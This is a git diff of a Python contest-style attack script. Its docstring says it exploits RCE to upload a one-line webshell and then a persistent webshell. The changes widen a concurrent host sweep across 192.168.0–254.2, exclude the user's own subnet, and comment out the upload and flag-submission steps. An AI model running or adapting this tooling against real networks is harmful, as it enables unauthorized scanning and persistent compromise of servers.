@@ -4,7 +4,7 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 from time import sleep
 import logging
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
-
+from awd.config import ownip_c
 '''
 用rce上传一句话木马，再上传不死马
 '''
@@ -14,7 +14,7 @@ requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
 # 配置参数
-IP_RANGE = range(228, 230)
+IP_RANGE = range(0, 255)
 PORTS = [80]  # 可扩展常见Web端口
 TIMEOUT = 3
 THREADS = 20
@@ -29,8 +29,8 @@ ma2 = ".index2.php"
 def process_host():
     """并发探活，返回可达IP列表"""
     live_ips = []
-    base_ips = [f"192.168.{i}.2" for i in IP_RANGE]
-
+    base_ips = [f"192.168.{i}.2" for i in IP_RANGE if i !=ownip_c]
+    print(base_ips)
     def check_ip(ip):
         for port in PORTS:
             try:
@@ -234,6 +234,7 @@ def upload_flag(flag_dict):
 
 if __name__ == "__main__":
     ip_list = process_host()
+    '''
     # with open("ip.txt", "r", encoding="utf-8") as f:
     #     ip_list = f.readlines()
     upload_res = upload_muma1(ip_list)
@@ -244,3 +245,4 @@ if __name__ == "__main__":
         upload_flag(flags)
     else:
         logging.warning("No flags found.")
+'''
